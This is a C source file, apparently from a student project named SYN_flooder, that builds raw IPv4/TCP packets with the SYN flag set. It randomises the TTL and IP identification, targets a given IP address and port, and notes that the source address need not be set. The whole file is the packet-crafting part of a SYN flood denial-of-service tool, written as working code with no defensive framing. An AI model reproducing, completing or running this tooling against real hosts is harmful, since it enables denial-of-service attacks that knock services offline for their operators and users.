/*
** packet.c for packet in /home/janel/Projects/templates/network/SYN_flooder
**
** Made by Janel
** Login   <janel@epitech.net>
**
** Started on  Mon May 29 16:18:58 2017 Janel
** Last update Tue Jul 25 16:21:57 2017 Janel
*/

# define _BSD_SOURCE
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include "syn_flooder.h"
#include "layer4.h"
#include "layer3.h"
#include "debug.h"

/*
** Only setting fields which are NOT 0.
** This area has already been memset (in main)
*/
static char		build_ip_header(unsigned char *packet,
					const char *target_ip_address)
{
  t_ip_header		*ip_header;

  INSIDE;
  ip_header = (t_ip_header *)packet;
  ip_header->header_length = 5;
  ip_header->version = 4;
  ip_header->time_to_live = RANDOM_NBR_RANGE(64, 255);
  ip_header->protocol = IPPROTO_TCP;
  ip_header->identification = htons(RANDOM_NBR_RANGE(0, 0xFFFF));
  ip_header->total_length = sizeof(struct iphdr) + sizeof(struct tcphdr);
  /* NOT REQUIRED TO SET SOURCE ADDRESS */
  if (inet_aton(target_ip_address, &ip_header->destination_address) != 1)
    return (PRINT_ERROR("inet_pton:"), FALSE);
  return (TRUE);
}

/*
** Only setting fields which are NOT 0.
** This area has already been memset (in main)
*/
static char	build_tcp_header(unsigned char *packet, const int port)
{
  t_tcp_header	*tcp_header;

  tcp_header = (t_tcp_header *)(packet + sizeof(struct iphdr));
  /* tcp_header->source_port = htons(6969); */					/* SET LATER */
  tcp_header->destination_port = htons(port);
  /* tcp_header->sequence_number = htons(1234);/\* RANDOM_NBR_RANGE(0, 0xFFFF) *\/ */ /* SET LATER */
  /* tcp_header->window = htons(5860);		 */				/* SET LATER */
  tcp_header->offset = 5;
  tcp_header->tcp_flag_syn = 1;
  return (TRUE);
}

__inline__ char		build_packet(unsigned char *packet,
				     const char *target_ip_address,
				     const int port)
{
  return (build_ip_header(packet, target_ip_address)
	  && build_tcp_header(packet, port));
}
